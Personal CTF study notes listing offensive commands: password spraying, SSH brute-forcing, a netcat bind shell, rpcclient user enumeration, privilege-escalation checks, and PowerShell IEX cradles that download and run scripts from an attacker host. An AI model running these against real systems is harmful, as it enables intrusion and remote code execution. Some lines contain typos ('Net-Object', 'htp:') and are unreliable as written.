# ctf_notes
notes gathered from doing numerous CTFs to help with further CTFs
<p> -----------------------------------------------------------------------------------------
<p> Windows & *nix:
<p> - password spraying:
<p> crackmapexec [module] -u [users.txt] -p [passwords.txt] [ip or ip range]
<p> - bruteforce (more options may be required, example used was SSH module):
<p> medusa -h [ip] -U [users.txt] -P [passwords.txt] -M [module] [ip] 
<p> general notes:
<p> known hosts ssh file will show all hosts the host has SSH'd into
<p> - command to reset a broke terminal session
<p> $> reset
<p> - ssh using private rsa instead of password:
<p> ssh -i [private rsa] [user]@[ip]
<p> - impacket tools location on kali
<p> /usr/share/doc/python3-impacket/examples/
<p> use evilwinrm for when you have winrm access and want RCE

<p> -----------------------------------------------------------------------------------------
</p>
<p> upgrade shell using python pty library and adds auto complete for steps 2+ :
<p> 1 - python -c 'import pty;pty.spawn("/bin/bash")'
<p> 2 - CTRL z
<p> 3 - stty raw -echo
<p> 4 - fg <enter key>
<p> 5 - export TERM=xterm
<p> -----------------------------------------------------------------------------------------
<p> - mysql syntax for navigation:
<p> show databases; (shows available databases)
<p> use [database name]; (selects database to use)
<p> show tables; (shows tables in database)
<p> describe [table name]; (shows more information on values inside table)
<p> select [table value] from [table]; (shows items inside the table values of the table)
<p> -----------------------------------------------------------------------------------------
<p> - use rpcclient to :
<p> rpcclient -U '[found user]%[found password]' [ip]
<p> > lookupnames administrator
<p> > lookupsids [copied SID and incremen the last octet by one for user enumeration]
<p> > e.g. SID: administrator s-1-5-21-4254423774-1266059056-3197185112-500 [last octet = 500, users are 1000+]
<p> 

<p> -----------------------------------------------------------------------------------------
<p> - file upload (works with powershell and linux):
<p> curl http://[ip]:[port]/[file] -output [file]
<p> - monitor all root processes:
<p> while true;do ps -ef | grep sh | grep -v sshd | grep root; done;
<p> show all files we have read access on:
<p> find . -readable






<p> *nix:
<p> common privilege escalation techniques:
<p> - seeing if any commands can be run as sude:
<p> sudo -l
<p> - check which programs are avilable on the system for priviledge escalation and send errors away from output
<p> which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
<p> - download all FTP contents (--no-passive if passive is not allowed):
<p> wget -m htp:anonymous:anonymous@<remote IP> (--no-passive) 
<p> - bind shell:
<p> (victim) nc -lp <port> -e /bin/bash  (attacker) rlwrap nc <ip> <port>
<p> - listing file/ directory structure:
<p> find . 
<p> - listing file structure and look for specific file/ directory name
<p> find . | grep -i <word to look for>
<p> - show all running processes:
<p> ss -lntp
<p> -find all running processes belonging to a specfic user
<p> ps -ef | grep <user>
<p> - SUID file enum:
<p> find / -perm -4000 -ls 2>/dev/null
<p> - find files belonging to a specific user:
<p> find / -user <user> -ls 2>/dev/null
<p> - get files running on localhost:
<p> curl http://127.0.0.1:[port>]/[file]
<p> -search for value [words] inside all files recursively:
<p> grep -r [words] ./





Windows:

<p> windows powershell locations:
<p> c:\Windows\System32\    - 32 bit
<p> c:\Windows\SysWow64\    - 32 bit
<p> c:\Windows\SysNative\   - 64 bit
<p> sysinternals:
<p> dump process using the ID given from Get-Process command
<p> .\procdump64.exe
<p> - if you have write access to SMB shares use this for RCE
<p> psexec.py [user]@[ip]
<p> - get current running processes using powershell:
<p> powershell Get-Process
File download:
cmd.exe
- certutil -urlcache -f http://<ip>:<port>/<file> <file output>

powershell:
- file upload (will auto run any .ps1 scripts): 
powershell IEX(New-Object Net.WebClient).downloadString("http://<ip>:<port>/<file>")
- using powershell directly causes reverse shell crash:
echo 'IEX(Net-Object Net.WebClient).downloadString("http://<ip>:<port>/<file>")' | powershell -noprofile - 
  


